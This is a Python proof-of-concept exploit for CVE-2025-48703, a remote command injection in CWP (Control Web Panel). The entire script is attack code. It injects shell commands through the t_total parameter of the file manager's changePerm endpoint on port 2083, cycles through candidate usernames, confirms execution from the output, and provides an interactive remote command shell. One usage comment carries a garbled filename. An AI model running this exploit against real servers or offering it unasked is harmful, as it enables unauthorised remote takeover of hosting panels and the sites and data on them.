#!/usr/bin/env python3
"""
CVE-2025-48703 - CWP (Control Web Panel) RCE PoC
Author: [Your Name]
Description: Proof-of-concept for remote code execution in CWP < 0.9.8.1205
"""

import requests
import sys
import urllib3
import argparse
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CWPExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        
    def test_vulnerability(self):
        """Test if target is vulnerable"""
        print(f"[+] Testing {self.target} for CVE-2025-48703")
        
        usernames = ["www-data", "apache", "nobody", "cwp"]
        
        for username in usernames:
            if self.exploit_rce("id", username):
                print(f"[+] Vulnerable! Working username: {username}")
                return True, username
                
        print("[-] Target does not appear vulnerable")
        return False, None
    
    def exploit_rce(self, command, username="www-data"):
        """Exploit RCE vulnerability"""
        encoded_cmd = quote(command)
        
        payloads = [
            f"1;{encoded_cmd}",
            f"1;{command}",
            f"1 && {command}",
            f"1;{command};echo"
        ]
        
        for payload in payloads:
            try:
                url = f"{self.target}:2083/filemanager/changePerm"
                params = {
                    't_total': payload,
                    'file': 'test.txt',
                    'user': username
                }
                
                print(f"[*] Trying GET: {url}?t_total={payload}")
                response = self.session.get(url, params=params)
                
                if self.is_command_executed(response, command):
                    print(f"[+] Command executed successfully!")
                    print(f"[+] Response: {response.text[:200]}...")
                    return True
                
                data = {
                    't_total': payload,
                    'file': 'test.txt',
                    'user': username
                }
                
                print(f"[*] Trying POST: {url}")
                response = self.session.post(url, data=data)
                
                if self.is_command_executed(response, command):
                    print(f"[+] Command executed successfully!")
                    print(f"[+] Response: {response.text[:200]}...")
                    return True
                    
            except Exception as e:
                print(f"[-] Error with payload {payload}: {e}")
                continue
                
        return False
    
    def is_command_executed(self, response, command):
        """Check if command was executed based on response"""
        if response.status_code != 200:
            return False
            
        text = response.text.lower()
        
        if command == "id":
            return "uid=" in text and "gid=" in text
        elif command == "whoami":
            return len(text.strip()) > 0 and "error" not in text
        elif command.startswith("echo"):
            test_string = command.split()[-1].strip('"\'')
            return test_string in text
        else:
            return len(text.strip()) > 0 and "error" not in text
    
    def interactive_shell(self, username):
        """Interactive command execution"""
        print(f"[+] Interactive shell - using username: {username}")
        print("[+] Type 'exit' to quit")
        
        while True:
            try:
                cmd = input("cwp-rce> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                    
                if cmd:
                    if self.exploit_rce(cmd, username):
                        pass 
                    else:
                        print("[-] Command execution failed")
                        
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                break
            except EOFError:
                break

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-48703 CWP RCE PoC')
    parser.add_argument('target', help='Target URL (e.g., https://target.com)')
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('-u', '--username', default='www-data', help='Username for exploitation')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive shell mode')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    exploit = CWPExploit(args.target)
    
    print("="*60)
    print("CVE-2025-48703 - CWP Remote Code Execution PoC")
    print("="*60)
    
    is_vuln, working_username = exploit.test_vulnerability()
    
    if not is_vuln:
        print("[-] Target is not vulnerable or not accessible")
        sys.exit(1)
    
    username = working_username or args.username
    
    if args.command:
        print(f"[+] Executing command: {args.command}")
        if exploit.exploit_rce(args.command, username):
            print("[+] Command executed successfully!")
        else:
            print("[-] Command execution failed")
    
    elif args.interactive:
        exploit.interactive_shell(username)
    
    else:
        print("[+] Vulnerability confirmed!")
        print(f"[+] Working username: {username}")
        print("[+] Use -c 'command' to execute commands")
        print("[+] Use -i for interactive shell")

if __name__ == "__main__":
    main()

# Example usage:
# python3 cvà¥‡-2025-48703-poc.py https://target.com
# python3 cve-2025-48703-poc.py https://target.com -c "whoami"
# python3 cve-2025-48703-poc.py https://target.com -i
